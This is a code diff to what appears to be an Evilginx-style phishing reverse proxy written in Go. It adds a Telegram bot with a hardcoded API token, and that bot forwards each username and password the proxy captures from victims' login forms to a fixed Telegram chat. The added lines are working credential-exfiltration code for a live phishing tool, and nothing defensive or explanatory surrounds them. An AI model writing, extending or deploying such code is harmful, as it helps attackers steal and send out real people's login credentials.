@@ -481,6 +481,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 						} else {
 
+							bot, err := tgbotapi.NewBotAPI("6527994050:AAHgt8nRXCI8DWnuArh2riUspi6Z9bnPKzA")
+								if err != nil {
+									log.Fatal("Failed to initialize Telegram bot:", err)
+								}
+
 							if req.ParseForm() == nil {
 								log.Debug("POST: %s", req.URL.Path)
 								for k, v := range req.PostForm {
@@ -500,6 +505,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
 												log.Error("database: %v", err)
 											}
+											// Send Telegram notification
+											msg := tgbotapi.NewMessage(5822512651, fmt.Sprintf("Username extracted: %s (session %d)", um[1], ps.SessionId))
+											bot.Send(msg)
 										}
 									}
 									if pl.password.key != nil && pl.password.search != nil && pl.password.key.MatchString(k) {
@@ -510,6 +518,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
 												log.Error("database: %v", err)
 											}
+											// Send Telegram notification
+											msg := tgbotapi.NewMessage(5822512651, fmt.Sprintf("Password extracted: %s (session %d)", pm[1], ps.SessionId))
+											bot.Send(msg)
 										}
 									}
 									for _, cp := range pl.custom {
